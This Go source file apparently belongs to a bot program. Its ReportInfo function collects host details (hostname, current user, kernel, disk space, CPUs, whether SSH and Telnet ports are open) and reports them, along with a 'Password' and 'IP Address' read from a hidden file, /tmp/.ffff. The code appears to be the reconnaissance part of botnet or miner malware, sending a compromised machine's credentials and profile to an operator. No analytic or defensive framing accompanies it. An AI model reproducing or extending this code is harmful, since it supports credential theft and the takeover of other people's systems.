package lib

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strconv"

	"golang.org/x/sys/unix"
)

func printPort(port string) string {
	if checkPort("127.0.0.1:"+port) != "" {
		return "OPEN"
	}
	return "CLOSE"
}

func (b *Bot) threadsNumber() string {
	return strconv.Itoa(b.CPU * 2)
}

func (b *Bot) getHostname() string {
	hostName, err := os.Hostname()
	if err != nil {
		return "🗑 Failed to get hostname!!!"
	}
	return hostName
}

func (b *Bot) execComd(comd string, args ...string) string {
	pComd, err := exec.Command(comd, args...).Output()
	if err != nil {
		return "🗑 Failed to execute command!!!"
	}
	return string(pComd)
}

func (b *Bot) getDiskSpace() string {
	wd, err := os.Getwd()
	if err != nil {
		return "🗑 Failed to get free disk space!!!"
	}
	var stat unix.Statfs_t
	unix.Statfs(wd, &stat)
	return fmt.Sprint(stat.Bavail * uint64(stat.Bsize) / 1024 / 1024 / 1024)
}

func (b *Bot) ReportInfo() {
	b.CPU = runtime.NumCPU()
	b.Report("Host Name: " + b.getHostname())
	b.Report("Password: " + b.execComd("head", "-1", "/tmp/.ffff"))
	b.Report("Current Permission: " + b.execComd("whoami"))
	b.Report("System: " + b.execComd("uname", "-a"))
	b.Report("Free Disk Space (GB): " + b.getDiskSpace())
	b.Report("Number of CPUs: " + strconv.Itoa(b.CPU))
	b.Report("Number of Threads: " + b.threadsNumber())
	b.Report("IP Address: " + b.execComd("tail", "-1", "/tmp/.ffff"))
	b.Report("Default SSH: " + printPort("22"))
	b.Report("Default Telnet: " + printPort("23"))
}
